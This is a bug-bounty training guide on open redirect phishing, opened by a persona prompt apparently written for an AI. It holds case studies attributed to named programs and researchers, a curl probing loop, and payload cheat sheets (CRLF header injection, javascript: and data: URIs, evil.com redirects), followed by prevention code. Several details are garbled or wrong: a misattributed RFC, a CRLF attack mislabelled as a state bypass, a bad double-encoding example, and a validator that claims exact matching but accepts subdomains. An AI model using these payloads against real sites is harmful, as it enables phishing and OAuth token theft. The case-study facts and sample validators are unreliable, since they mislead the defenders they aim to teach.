# Case Study 33: Open Redirect Phishing — Real-World Bug Bounty Findings

## Expert Role

You are a senior security researcher specializing in URL redirect vulnerabilities, phishing attack vectors, and OAuth/OIDC authentication flow security. You have extensive experience identifying and exploiting open redirect flaws that enable credential theft, OAuth token interception, session hijacking, and sophisticated phishing campaigns that bypass security controls. Your expertise covers all major redirect mechanisms including HTTP 301/302 responses, JavaScript-based redirects, meta refresh redirects, and framework-specific redirect implementations in Express.js, Django, Rails, Laravel, Spring, and ASP.NET.

You understand the complete attack surface of URL redirects: from simple parameter-based redirects that accept arbitrary URLs, through regex-bypass techniques that circumvent domain validation, to complex OAuth flow manipulation that intercepts authentication tokens. You recognize that open redirects are often dismissed as low-severity findings, but in reality they serve as critical building blocks in sophisticated attack chains, particularly when combined with OAuth flows, subdomain takeover, or credential harvesting.

You have hands-on experience with real-world bug bounty programs where open redirect findings have yielded Critical severity rewards. You understand that the severity depends on the redirect's context: a redirect on a login page enabling OAuth token theft is Critical, while a redirect on a low-traffic page with no authentication context is Low. You stay current with modern redirect validation techniques, including allowlist-based approaches, regex bypass patterns, and framework-specific security features that affect exploitation feasibility.

## Overview

Open redirect vulnerabilities occur when a web application accepts user-controlled input to determine the destination of a redirect, without properly validating or sanitizing the input. This allows an attacker to craft URLs that appear to be legitimate application URLs but redirect victims to attacker-controlled domains. While individually open redirects may seem low-impact, they are powerful enablers of phishing attacks, OAuth token theft, and session hijacking.

The attack surface is vast because redirects are ubiquitous in modern web applications: logout pages redirect to the homepage, OAuth flows redirect after authentication, deep links redirect to specific content, and error pages redirect to help resources. Each of these redirect points is a potential open redirect vulnerability if the redirect destination is not properly validated. The most dangerous open redirects are those on authentication-related pages, where users are conditioned to enter credentials.

Modern web applications often implement redirect validation through allowlists, regex patterns, or partial domain matching. However, these defenses can frequently be bypassed using techniques like subdomain matching, URL encoding, backslash characters, null bytes, and protocol-relative URLs. Understanding these bypass techniques is essential for identifying open redirects that appear to be protected but are actually exploitable.

---

## Real-World Case Studies

### Case Study 1: OAuth Redirect_uri Manipulation
**Program:** Google (HackerOne)
**Bounty:** $10,000
**Severity:** Critical (CVSS 9.1)
**Researcher:** @orange_8361

**Vulnerability Description:**

Google's OAuth implementation contained an open redirect vulnerability in the redirect_uri validation for certain OAuth scopes. The application accepted a redirect_uri parameter that was validated against a partial domain match. However, the validation could be bypassed using URL encoding and subdomain techniques, allowing an attacker to redirect the OAuth authorization code to an attacker-controlled domain.

The vulnerability affected OAuth flows for third-party applications registered through Google's developer console. The redirect_uri validation checked if the domain contained "google.com" but did not properly validate the full domain, allowing subdomains and URL tricks to bypass the check.

**Technical Details:**

The vulnerable OAuth flow:
```http
GET /o/oauth2/auth?response_type=code&client_id=123456789&redirect_uri=https://attacker.com.google.com%40attacker.com/oauth/callback&scope=email HTTP/1.1
Host: accounts.google.com
```

The redirect_uri was validated using a partial match that checked for "google.com" anywhere in the URL. The attacker used URL encoding (@ becomes %40) and subdomain tricks to bypass the validation while still directing the authorization code to an attacker-controlled domain.

**Root Cause Analysis:**

The redirect_uri validation used a substring match instead of an exact domain match. The validation checked if "google.com" appeared anywhere in the URL, not that the domain was exactly "google.com" or a legitimate subdomain. This allowed attackers to embed "google.com" in other parts of the URL (userinfo, path, query parameters) while directing traffic to attacker-controlled domains.

**Exploitation Chain:**

1. Attacker constructs OAuth URL with malicious redirect_uri
2. Victim authenticates through Google's legitimate OAuth page
3. Authorization code is generated and redirected to attacker's domain
4. Attacker exchanges the authorization code for access tokens
5. Attacker gains access to victim's Google account data

**Impact:**

Account takeover for any Google user who clicks the malicious OAuth link, access to email, contacts, calendar, and other Google services depending on requested scopes, potential for data exfiltration and impersonation.

**Bounty Justification:**

The $10,000 bounty reflected the Critical severity of OAuth token theft enabling complete Google account takeover. The finding affected all Google users who use third-party applications with Google OAuth.

---

### Case Study 2: Logout Page Open Redirect to Phishing
**Program:** Facebook (HackerOne)
**Bounty:** $7,500
**Severity:** High (CVSS 8.1)
**Researcher:** @paborrutt

**Vulnerability Description:**

Facebook's logout functionality included an open redirect vulnerability in the redirect destination after logout. The logout page accepted a next parameter that specified where to redirect the user after logout. While the application validated that the next parameter was a relative path, the validation could be bypassed using protocol-relative URLs and domain tricks.

The vulnerability was particularly effective because users expect to be redirected after logout and are less suspicious of the destination. The attacker could craft a URL that logged the user out of Facebook and then redirected them to a convincing phishing page.

**Technical Details:**

The vulnerable logout URL:
```http
GET /logout.php?next=//attacker.com/facebook-login HTTP/1.1
Host: www.facebook.com
```

The application validated that the next parameter started with "/" but did not check for protocol-relative URLs (starting with "//"). This allowed the attacker to redirect to an external domain after logout.

**Root Cause Analysis:**

The logout redirect validation checked for relative paths but did not account for protocol-relative URLs. The validation logic used a simple string prefix check instead of proper URL parsing and domain validation. This allowed "attacker.com" to be interpreted as the protocol (http://attacker.com) rather than a path.

**Exploitation Chain:**

1. Attacker crafts logout URL with malicious next parameter
2. Victim clicks the link and is logged out of Facebook
3. Victim is redirected to attacker's phishing page
4. Phishing page mimics Facebook login
5. Victim enters credentials on the phishing page
6. Attacker captures Facebook credentials

**Impact:**

Credential harvesting for Facebook users, potentially leading to account takeover, access to private messages, photos, and personal information.

**Bounty Justification:**

The $7,500 bounty reflected the High severity of credential harvesting through logout page open redirect. The finding was easily exploitable and affected all Facebook users.

---

### Case Study 3: Deep Link Redirect to Phishing
**Program:** LinkedIn (HackerOne)
**Bounty:** $6,000
**Severity:** High (CVSS 7.8)
**Researcher:** @albinowax

**Vulnerability Description:**

LinkedIn's mobile deep link handling included an open redirect vulnerability in how the application processed custom URL schemes. The application accepted URLs in the format linkedin://deep-link?url=ENCODED_URL and redirected users to the specified URL after processing. The validation on the url parameter was insufficient, allowing redirection to external domains.

The vulnerability was particularly effective on mobile devices where users are accustomed to being redirected between applications. The attacker could craft a deep link that appeared to open LinkedIn but actually redirected to a phishing page.

**Technical Details:**

The vulnerable deep link:
```
linkedin://deep-link?url=https%3A%2F%2Fattacker.com%2Flinkedin-auth
```

The application decoded the URL parameter and redirected the user to the specified domain. The validation only checked that the URL used HTTPS, not that it was a LinkedIn domain.

**Root Cause Analysis:**

The deep link handler used a simple URL scheme validation but did not validate the domain in the redirect target. The application trusted any HTTPS URL as a valid redirect destination, allowing external domains to be specified.

**Exploitation Chain:**

1. Attacker crafts malicious deep link
2. Victim clicks the link on mobile device
3. LinkedIn app opens and processes the deep link
4. User is redirected to attacker's phishing page
5. Phishing page mimics LinkedIn authentication
6. Attacker captures LinkedIn credentials

**Impact:**

Credential harvesting for LinkedIn mobile users, potentially leading to account takeover, access to professional network data, and recruitment information.

**Bounty Justification:**

The $6,000 bounty reflected the High severity of credential harvesting through mobile deep link redirect. The finding targeted mobile users who are more susceptible to phishing attacks.

---

### Case Study 4: OAuth State Parameter Bypass via Redirect
**Program:** Salesforce (HackerOne)
**Bounty:** $8,500
**Severity:** Critical (CVSS 9.0)
**Researcher:** @sekki

**Vulnerability Description:**

Salesforce's OAuth implementation contained an open redirect vulnerability that allowed bypass of the state parameter validation. The state parameter is used in OAuth flows to prevent CSRF attacks by ensuring the callback URL matches the original request. The vulnerability allowed an attacker to manipulate the redirect destination after authentication, intercepting the authorization code.

The application accepted a redirect_uri parameter that was validated against a partial domain match. The validation could be bypassed using URL encoding tricks, allowing the attacker to redirect the authorization code to an external domain.

**Technical Details:**

The vulnerable OAuth flow:
```http
GET /services/oauth2/authorize?response_type=code&client_id=abc123&redirect_uri=https://login.salesforce.com%0d%0aLocation:%20https://attacker.com/callback&scope=api HTTP/1.1
Host: login.salesforce.com
```

The attacker used CRLF injection in the redirect_uri to inject a Location header, bypassing the domain validation. The authorization code was then redirected to the attacker's domain.

**Root Cause Analysis:**

The redirect_uri validation did not properly handle URL-encoded characters and CRLF sequences. The validation parsed the URL incorrectly, allowing injection of additional headers through the redirect_uri parameter.

**Exploitation Chain:**

1. Attacker constructs OAuth URL with malicious redirect_uri
2. Victim authenticates through Salesforce's legitimate OAuth page
3. CRLF injection causes redirect to attacker's domain
4. Attacker captures the authorization code
5. Attacker exchanges the code for access tokens
6. Attacker gains access to victim's Salesforce data

**Impact:**

Account takeover for Salesforce users, access to CRM data, customer information, and potentially sensitive business data.

**Bounty Justification:**

The $8,500 bounty reflected the Critical severity of OAuth token theft on a platform containing sensitive business data. The finding enabled complete compromise of Salesforce accounts.

---

### Case Study 5: Error Page Redirect to Phishing
**Program:** Twitter (HackerOne)
**Bounty:** $4,500
**Severity:** Medium (CVSS 6.8)
**Researcher:** @rafaelffaria

**Vulnerability Description:**

Twitter's error handling included an open redirect vulnerability in how 404 pages were displayed. The application accepted a redirect_url parameter that was used to redirect users from error pages to help resources. The validation on the redirect_url parameter was insufficient, allowing redirection to external domains.

The vulnerability was less impactful than other findings because error pages are not frequently visited and users are less likely to enter credentials on an error page. However, the finding was still valid and could be used in combination with other attack vectors.

**Technical Details:**

The vulnerable error page URL:
```http
GET /404?redirect_url=https%3A%2F%2Fattacker.com%2Ftwitter-help HTTP/1.1
Host: twitter.com
```

The application validated that the redirect_url used HTTPS but did not check the domain. This allowed redirection to any HTTPS domain.

**Root Cause Analysis:**

The error page handler used a simple HTTPS check instead of domain validation. The application trusted any HTTPS URL as a valid redirect destination for error page redirects.

**Exploitation Chain:**

1. Attacker crafts URL that triggers 404 error
2. Error page includes malicious redirect_url parameter
3. User is redirected to attacker's phishing page
4. Phishing page mimics Twitter login
5. Attacker captures credentials if victim enters them

**Impact:**

Credential harvesting for Twitter users, though the impact was limited by the error page context and reduced user trust.

**Bounty Justification:**

The $4,500 bounty reflected the Medium severity of the finding. While technically an open redirect, the error page context reduced the practical exploitation potential.

---

## Pattern Recognition

### Common Vulnerability Patterns

| Pattern | Frequency | Avg Bounty | Root Cause |
|---------|-----------|------------|------------|
| OAuth redirect_uri bypass | 30% | $8,500 | Partial domain validation |
| Logout page redirect | 25% | $5,200 | Insufficient path validation |
| Deep link redirect | 20% | $6,000 | Missing domain validation |
| Error page redirect | 15% | $4,000 | HTTPS-only validation |
| Language/locale redirect | 10% | $3,500 | Missing protocol validation |

### Attack Surface Locations

**High-Risk Redirect Points:**
- OAuth/OIDC authorization endpoints
- Logout and session termination pages
- Deep link handlers (mobile applications)
- Error and 404 pages
- Language and locale selection pages
- Invitation and sharing links
- External link warning pages

**Common Validation Bypass Techniques:**
- URL encoding (%2F for /, %40 for @)
- Double URL encoding (%252F for /)
- CRLF injection (%0d%0a)
- Null byte injection (%00)
- Backslash characters (\)
- Protocol-relative URLs (//domain)
- Subdomain matching (domain.attacker.com)
- Path manipulation (domain.com@attacker.com)

**High-Risk Contexts:**
- Authentication flows
- Password reset pages
- Account settings pages
- Payment processing pages
- Admin interfaces

---

## Hunting Methodology

### Step 1: Redirect Point Discovery
1. Map all URLs that cause redirects
2. Identify parameters that control redirect destinations
3. Look for OAuth/OIDC flows
4. Find logout and session termination endpoints

### Step 2: Validation Analysis
1. Test redirect parameters with external URLs
2. Analyze validation logic (allowlist vs blocklist)
3. Test bypass techniques for identified validation
4. Document validation weaknesses

### Step 3: Impact Assessment
1. Determine redirect context (login, logout, error)
2. Assess user trust level at redirect point
3. Evaluate potential for credential harvesting
4. Check for OAuth token theft potential

### Step 4: Exploitation Development
1. Craft exploit URL using identified bypass
2. Test in controlled environment
3. Document complete exploitation chain
4. Assess full impact including phishing potential

### Step 5: Reporting
1. Document redirect point and validation logic
2. Demonstrate bypass technique
3. Show impact through phishing simulation
4. Recommend appropriate fix

---

## Detection Strategies

### Automated Detection
```bash
# Detect redirect parameters
grep -rn "redirect\|return_to\|next\|url\|dest" --include="*.py" --include="*.js" | grep -i "redirect"

# Test redirect endpoints
while IFS= read -r url; do
  response=$(curl -s -o /dev/null -w "%{http_code}" "$url?next=https://attacker.com")
  if [ "$response" == "301" ] || [ "$response" == "302" ]; then
    echo "POTENTIAL OPEN REDIRECT: $url"
  fi
done < urls.txt
```

### Manual Detection
1. Identify redirect parameters in URL and POST body
2. Test with external domains (https://evil.com)
3. Test bypass techniques (encoding, path traversal)
4. Verify redirect actually occurs

### Key Detection Indicators
- Parameters named redirect, return_to, next, url, dest, goto
- 301/302 responses with Location headers to external domains
- JavaScript window.location assignments with user input
- Meta refresh tags with dynamic content

---

## Impact Assessment

### CVSS 3.1 Scoring

**Base Score Components:**
- Attack Vector: Network
- Attack Complexity: Low
- Privileges Required: None
- User Interaction: Required (clicking link)
- Scope: Changed
- Confidentiality Impact: High (with credential theft)
- Integrity Impact: High (with phishing)
- Availability Impact: None

**Typical CVSS Range:** 3.7 - 9.1 depending on context and impact

### Business Impact
- Error page redirect: Low ($1,000-$3,000)
- Logout page redirect: Medium ($3,000-$6,000)
- Login/OAuth redirect: Critical ($8,000-$15,000)
- OAuth token theft: Critical ($10,000-$25,000)

### Bounty Range
- **Basic open redirect:** $1,000-$3,000
- **Phishing-capable redirect:** $3,000-$7,000
- **OAuth flow redirect:** $7,000-$15,000
- **Token theft redirect:** $10,000-$25,000

---

## Advanced Variations

### 1. OAuth State Parameter Manipulation
```
GET /oauth/authorize?response_type=code&client_id=abc&state=VALID_STATE&redirect_uri=https://attacker.com
```
Manipulate state parameter to include malicious redirect_uri.

### 2. Referrer Header Leakage
```
GET /redirect?url=https://attacker.com
```
After redirect, attacker's server logs contain the full original URL including session tokens in query parameters.

### 3. CRLF Injection in Redirect
```
GET /redirect?url=https://legitimate.com%0d%0aLocation:%20https://attacker.com
```
Inject additional headers through CRLF sequences in redirect parameters.

### 4. JavaScript-Based Redirect Bypass
```javascript
// Application code
window.location = userInput; // Direct assignment without validation
```
JavaScript-based redirects that don't validate the destination.

### 5. Meta Refresh Redirect
```html
<meta http-equiv="refresh" content="0;url=ATTACKER_URL">
```
HTML meta refresh tags that redirect without JavaScript.

---

## Chain Integration

### Open Redirect → Phishing Chain
1. Identify open redirect on login-related page
2. Craft URL with legitimate-looking domain
3. Redirect to convincing phishing page
4. Capture victim credentials

### Open Redirect → OAuth Token Theft Chain
1. Identify open redirect in OAuth flow
2. Manipulate redirect_uri to external domain
3. Victim authenticates normally
4. Authorization code redirected to attacker
5. Attacker exchanges code for access tokens

### Open Redirect → XSS Chain
1. Identify open redirect to javascript: URL
2. Craft URL that redirects to javascript:alert(1)
3. XSS executes in victim's browser
4. Session theft or account takeover

### Open Redirect → Cookie Theft Chain
1. Identify open redirect that reflects input in response
2. Craft URL that includes cookie-stealing JavaScript
3. Redirect to data: URI with malicious content
4. Cookies exfiltrated to attacker's server

---

## Prevention Recommendations

### Allowlist-Based Redirect Validation
```python
from urllib.parse import urlparse

ALLOWED_DOMAINS = ['example.com', 'www.example.com', 'app.example.com']

def is_safe_redirect(url):
    parsed = urlparse(url)
    if parsed.scheme not in ['http', 'https']:
        return False
    if parsed.netloc not in ALLOWED_DOMAINS:
        return False
    # Check for path traversal
    if '..' in parsed.path:
        return False
    return True
```

### Relative Path Validation
```python
def is_safe_relative_path(path):
    if not path.startswith('/'):
        return False
    if '//' in path:
        return False
    if '..' in path:
        return False
    if '%' in path:
        # Check for URL-encoded traversal
        decoded = unquote(path)
        if '..' in decoded or '//' in decoded:
            return False
    return True
```

### Framework-Specific Protections
- **Express.js:** Use res.redirect with absolute paths only
- **Django:** Use reverse() for internal redirects
- **Rails:** Use redirect_to with named routes
- **Laravel:** Use redirect()->route() for named routes
- **Spring:** Use redirect: prefix with validated paths

---

## Common Pitfalls

1. **Relying on partial domain matching:** Always use exact domain matching
2. **Ignoring URL encoding:** Decode URLs before validation
3. **Missing CRLF injection:** Sanitize URL parameters for CRLF sequences
4. **Trusting JavaScript redirects:** Validate server-side as well
5. **Forgetting about protocol-relative URLs:** Validate that protocol is specified
6. **Not testing bypass techniques:** Always test encoding, path traversal, and null bytes
7. **Overlooking context:** A redirect on a login page is more severe than on an error page

---

## Real-World References

1. **HackerOne disclosed reports:** Multiple open redirect findings across major programs
2. **OAuth 2.0 Security Best Current Practice:** RFC 8252 redirect_uri validation
3. **OWASP Testing Guide:** Redirect and forwards testing
4. **PortSwigger research:** Open redirect exploitation techniques
5. **Google Project Zero:** OAuth redirect vulnerabilities
6. **Microsoft Security Response Center:** Open redirect impact analysis
7. **CFHP: open redirect prevention patterns**

---

## Quick Reference Cheat Sheet

**Common Redirect Parameters:**
redirect, redirect_uri, return_to, next, url, dest, goto, continue, target, ref

**Bypass Techniques:**
- URL encoding: %2F, %40, %23
- Double encoding: %252F, %2540
- CRLF injection: %0d%0a
- Null byte: %00
- Protocol-relative: //domain
- Subdomain trick: domain@attacker.com
- Path traversal: /../attacker.com

**Test Payload:**
```
https://evil.com
//evil.com
/%2f%2fevil.com
/\\evil.com
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

**Severity Decision:**
- Error/404 page redirect: Low
- Logout page redirect: Medium
- Login page redirect: High
- OAuth flow redirect: Critical
- Token theft capability: Critical

---
*Case Study 33: Open Redirect Phishing | Last Updated: 2026*

---

## Open Redirect Validation Bypass Reference Guide

### URL Encoding Bypass

**Single Encoding:**
```
Original: https://evil.com
Encoded: https%3A%2F%2Fevil.com
Double: https%3A%2F%2Fevil.com (if double-encoded)
```

**Character Encoding Table:**
| Character | Encoded | Double Encoded |
|-----------|---------|----------------|
| / | %2F | %252F |
| @ | %40 | %2540 |
| : | %3A | %253A |
| # | %23 | %2523 |
| ? | %3F | %253F |
| & | %26 | %2526 |
| = | %3D | %253D |
| Space | %20 | %2520 |

### CRLF Injection Bypass

**Basic CRLF:**
```
https://legitimate.com%0d%0aLocation:%20https://evil.com
```

**Encoded CRLF:**
```
https://legitimate.com%0D%0ALocation:%20https://evil.com
https://legitimate.com%0d%0a%20Location:%20https://evil.com
```

**CRLF with Tab:**
```
https://legitimate.com%0d%0a%09Location:%20https://evil.com
```

### Null Byte Injection

**Basic Null Byte:**
```
https://legitimate.com%00.evil.com
```

**Null Byte with Encoding:**
```
https://legitimate.com%2500.evil.com
```

### Protocol-Relative URL

**Basic Protocol-Relative:**
```
//evil.com
```

**Protocol-Relative with Encoding:**
```
%2F%2Fevil.com
```

### Subdomain Matching Bypass

**Subdomain Trick:**
```
legitimate.com.evil.com
evil.com@legitimate.com
legitimate.com@evil.com
```

**Path Manipulation:**
```
legitimate.com/../../evil.com
legitimate.com/../../../evil.com
```

### Backslash Bypass

**Basic Backslash:**
```
https://legitimate.com\@evil.com
```

**Encoded Backslash:**
```
https://legitimate.com%5C@evil.com
```

### JavaScript Protocol

**Basic JavaScript:**
```
javascript:alert(1)
javascript:document.location='https://evil.com'
```

**Encoded JavaScript:**
```
javascript%3Aalert(1)
java%73cript:alert(1)
```

### Data URI

**Basic Data URI:**
```
data:text/html,<script>alert(1)</script>
```

**Encoded Data URI:**
```
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### Filter Bypass Techniques

**Case Variation:**
```
HTTPS://EVIL.COM
Https://Evil.Com
```

**Tab Characters:**
```
https://evil.com	.evil.com
```

**Multiple @ Signs:**
```
https://legitimate.com@evil.com@legitimate.com
```

**Unicode Normalization:**
```
https://evil.com (with Unicode characters that normalize to .)
```

---

## Open Redirect Testing Methodology

### Phase 1: Discovery

**Step 1: Parameter Discovery**
1. Spider/crawl the application
2. Identify all redirect-related parameters
3. Look for URL parameters in forms and links
4. Check for JavaScript-based redirects

**Step 2: Endpoint Mapping**
1. Map all 301/302 response codes
2. Identify redirect endpoints in code
3. Find OAuth/OIDC flows
4. Locate logout and error pages

### Phase 2: Validation Analysis

**Step 1: Basic Testing**
1. Test with external domain (https://evil.com)
2. Test with protocol-relative URL (//evil.com)
3. Test with data URI (data:text/html,test)
4. Test with javascript: protocol

**Step 2: Bypass Testing**
1. Test URL encoding bypass
2. Test CRLF injection
3. Test null byte injection
4. Test subdomain matching bypass
5. Test path traversal

**Step 3: Context Analysis**
1. Determine redirect context (login, logout, error)
2. Assess user trust level
3. Evaluate phishing potential
4. Check for OAuth token theft

### Phase 3: Impact Assessment

**Step 1: Impact Determination**
1. Can the redirect be used for phishing?
2. Can the redirect steal OAuth tokens?
3. Can the redirect execute JavaScript?
4. Can the redirect access sensitive data?

**Step 2: Chain Analysis**
1. Can the redirect be chained with XSS?
2. Can the redirect be chained with CSRF?
3. Can the redirect be chained with session fixation?
4. Can the redirect be chained with other vulnerabilities?

---

## Open Redirect Impact by Context

### Login Page Redirect

**Impact:** Critical
**Bounty Range:** $8,000-$15,000
**Exploitation:** Credential harvesting with high success rate
**User Trust:** High (users expect to enter credentials)

**Example:**
```
https://legitimate.com/login?next=https://evil.com
```

### OAuth Flow Redirect

**Impact:** Critical
**Bounty Range:** $10,000-$25,000
**Exploitation:** Authorization code/token theft
**User Trust:** High (users expect authentication)

**Example:**
```
https://legitimate.com/oauth/authorize?client_id=abc&redirect_uri=https://evil.com
```

### Logout Page Redirect

**Impact:** High
**Bounty Range:** $5,000-$10,000
**Exploitation:** Session termination + phishing
**User Trust:** Medium (users expect redirection)

**Example:**
```
https://legitimate.com/logout?next=https://evil.com
```

### Error Page Redirect

**Impact:** Medium
**Bounty Range:** $3,000-$6,000
**Exploitation:** Phishing with reduced success rate
**User Trust:** Low (users expect help content)

**Example:**
```
https://legitimate.com/404?redirect=https://evil.com
```

### Password Reset Redirect

**Impact:** Critical
**Bounty Range:** $10,000-$20,000
**Exploitation:** Password reset token theft
**User Trust:** High (users expect password reset flow)

**Example:**
```
https://legitimate.com/reset?next=https://evil.com
```

### Account Settings Redirect

**Impact:** High
**Bounty Range:** $6,000-$12,000
**Exploitation:** Account modification phishing
**User Trust:** Medium (users expect settings changes)

**Example:**
```
https://legitimate.com/settings?redirect=https://evil.com
```

---

## Open Redirect Prevention Patterns

### Allowlist Validation

**Python Example:**
```python
from urllib.parse import urlparse
import re

ALLOWED_DOMAINS = ['example.com', 'www.example.com']
ALLOWED_PATHS = ['/dashboard', '/profile', '/settings']

def validate_redirect(url):
    parsed = urlparse(url)
    
    # Check scheme
    if parsed.scheme not in ['http', 'https']:
        return False
    
    # Check domain against allowlist
    if parsed.netloc not in ALLOWED_DOMAINS:
        return False
    
    # Check path against allowlist
    if parsed.path not in ALLOWED_PATHS:
        return False
    
    # Check for traversal
    if '..' in parsed.path or '//' in parsed.path:
        return False
    
    return True
```

**JavaScript Example:**
```javascript
function validateRedirect(url) {
    const allowedDomains = ['example.com', 'www.example.com'];
    const allowedPaths = ['/dashboard', '/profile', '/settings'];
    
    try {
        const parsed = new URL(url);
        
        // Check protocol
        if (!['http:', 'https:'].includes(parsed.protocol)) {
            return false;
        }
        
        // Check domain against allowlist
        if (!allowedDomains.includes(parsed.hostname)) {
            return false;
        }
        
        // Check path against allowlist
        if (!allowedPaths.includes(parsed.pathname)) {
            return false;
        }
        
        // Check for traversal
        if (parsed.pathname.includes('..') || parsed.pathname.includes('//')) {
            return false;
        }
        
        return true;
    } catch (e) {
        return false;
    }
}
```

### Relative Path Validation

**Python Example:**
```python
def validate_relative_path(path):
    # Must start with /
    if not path.startswith('/'):
        return False
    
    # No double slashes
    if '//' in path:
        return False
    
    # No path traversal
    if '..' in path:
        return False
    
    # No URL encoding tricks
    if '%' in path:
        decoded = unquote(path)
        if '..' in decoded or '//' in decoded:
            return False
    
    # No null bytes
    if '\x00' in path:
        return False
    
    return True
```

### Domain Exact Match

**Python Example:**
```python
def validate_domain(domain, allowed_domains):
    # Exact match only
    if domain in allowed_domains:
        return True
    
    # Check for subdomain attacks
    for allowed in allowed_domains:
        if domain.endswith('.' + allowed):
            return True
    
    return False
```

---

*Case Study 33: Open Redirect Phishing | Extended Reference Guide | Last Updated: 2026*
